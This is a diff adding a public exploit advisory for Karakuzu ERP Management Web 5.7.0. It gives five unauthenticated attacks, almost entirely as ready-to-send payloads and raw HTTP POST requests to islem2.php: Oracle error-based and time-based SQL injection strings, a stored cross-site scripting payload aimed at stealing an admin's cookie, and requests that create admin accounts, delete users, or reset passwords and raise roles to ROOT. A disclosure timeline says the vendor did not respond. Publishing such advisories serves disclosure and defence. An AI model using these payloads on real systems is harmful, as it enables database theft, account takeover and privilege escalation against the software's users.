@@ -1,0 +1,91 @@
+# Exploit Title: Karakuzu ERP Management Web 5.7.0 - 'k_adi_duz' SQL Injection
+# Discovery Date: 2019-09-20
+# Exploit Author: Hakan TAŞKÖPRÜ
+# Vendor Homepage: http://karakuzu.info/
+# Effected Version <= 5.7.0
+
+Vulnerability #1: Unauthenticated SQL Injection
+==================================================
+
+Type: Error-based
+Title: Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)
+Payload: k_adi_duz=USERNAME' WHERE 4964=4964 AND
+1355=CTXSYS.DRITHSX.SN(1355,(CHR(113)||CHR(118)||CHR(118)||CHR(113)||CHR(113)||(SELECT
+(CASE WHEN (1355=1355) THEN 1 ELSE 0 END) FROM
+DUAL)||CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)))--
+DhDH&k_yetki_duz=USER&kullanici_duzenle=
+
+Type: Time-based blind
+Title: Oracle AND time-based blind
+Payload: k_adi_duz=USERNAME' WHERE 8074=8074 AND
+6437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(122)||CHR(90)||CHR(65)||CHR(88),5)--
+VuHD&k_yetki_duz=USER&kullanici_duzenle=
+
+POST /TARGET_PATH/netting/islem2.php HTTP/1.1
+Host: TARGET
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+
+k_adi_duz=[HERE]&k_email_duz=[HERE]&k_grup_duz=[HERE]&k_yetki_duz=[HERE]&k_sifre_duz=[HERE]&kullanici_duzenle=
+Description: k_adi_duz, k_email_duz, k_grup_duz, k_yetki_duz and
+k_sifre_duz parameters are injectable/vulnerable.
+
+Vulnerability #2: Unauthenticated Stored Cross Site Scripting in User
+Management Panel
+=======================================================================================
+Description : An attacker can stole an admin’s cookie.
+POST /TARGET_PATH/netting/islem2.php HTTP/1.1
+Host: TARGET
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+
+k_adi=VULN_USERNAME&k_email=VULN+EMAIL" onfocus="alert(1)"
+autofocus="&k_grup=TEST&k_yetki=ROOT&k_sifre=PASSWORD&kullanici_kayit=
+
+Vulnerability #3: Unauthenticated Creating Admin User
+======================================================
+Description : An attacker can create an admin or normal account.
+
+Request:
+
+POST /TARGET_PATH/netting/islem2.php HTTP/1.1
+Host: TARGET
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+k_adi=VULN_USERNAME&k_email=VULN+EMAIL&k_grup=TEST&k_yetki=ROOT&k_sifre=PASSWORD&kullanici_kayit=
+
+Vulnerability #4: Unauthenticated Deleting User
+=============================================
+Description : An attacker can delete an admin or normal account.
+
+POST /TARGET_PATH/netting/islem2.php HTTP/1.1
+Host: TARGET
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+
+kullanici_sil=k_adi_duz=USERNAME_TO_DELETE
+
+Vulnerability #5: Unauthenticated Editing User
+===============================================
+Description : An attacker can change a user’s password or role(e.g ROOT).
+POST /TARGET_PATH/netting/islem2.php HTTP/1.1
+Host: TARGET
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+k_adi_duz=USERNAME&k_email_duz=VULN+MAIL&k_grup_duz=GROUP&k_yetki_duz=ROOT&k_sifre_duz=NEW_PASSWORD&kullanici_duzenle=
+
+### History
+=============
+2019-09-20  Issue discovered
+2019-11-19  Vendor contacted (No response)
+2020-01-03  Issue published
